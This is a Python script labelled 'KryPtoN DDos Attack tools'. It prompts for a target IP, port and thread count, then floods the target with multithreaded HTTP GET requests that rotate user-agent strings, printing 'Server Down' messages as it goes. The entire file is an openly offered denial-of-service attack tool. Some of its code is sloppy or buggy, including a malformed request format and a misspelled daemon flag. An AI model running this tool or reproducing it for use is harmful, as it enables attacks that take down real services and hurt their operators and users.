import sys
import os
import time
import socket
import random
import threading

from colorama import Fore
from queue import Queue

title = """
KryPtoN DDos Attack tools
"""
data = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive"""

print(title)
def input_usr():
	global ip
	global port
	global t
	while True:
		try:
			ip = str(input('Enter target IP: '))
			port = int(input('Enter target Port: '))
			t = int(input('Enter thread: '))
		except ValueError:
			print(Fore.YELLOW + '[WARNING] Please enter corectly')
			continue
		else:
			break

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)

def down(host, port):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, int(port)))
			if s.sendto(packet, (host, int(port))):
				s.shutdown(.1)
				print(Fore.GREEN + '[INFO] Packet sended...')
			else:
				s.shutdown(.1)
				print(Fore.RED + '[DED] Server Down!!!...')
			time.sleep(.1)
	except socket.error as err:
				print(Fore.YELLOW + '[WARNING] No connection internet')
				print(err)
				return 

def dos():
	while True:
		item = q.get()
		down(ip, port)
		q.task_done()

input_usr()

print(f'\n[INFO] Preparing service for attacking to {ip}:{port}')
print('>>>[                    ] 0% ')
q = Queue()
time.sleep(3)

print('>>>[==========          ] 50%')
bytes = random._urandom(1490)
time.sleep(5)

print('>>>[============== ] 100%')
user_agent()
print('[INFO] Starting to attacking\n')
time.sleep(2)

# Start to flodding
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, int(port)))
	s.settimeout(1)
except socket.error as err:
	print(Fore.YELLOW + '[WARNING] Check IP and Port')
	print(err)
while True:
	for i in range(int(t)):
		t = threading.Thread(target=dos)
		t.demon = True
		t.start()
		item = 0
	while True:
		if (item > 1800):
			item=0
			time.sleep(.1)
		item = item + 1
		q.put(item)
	q.join()
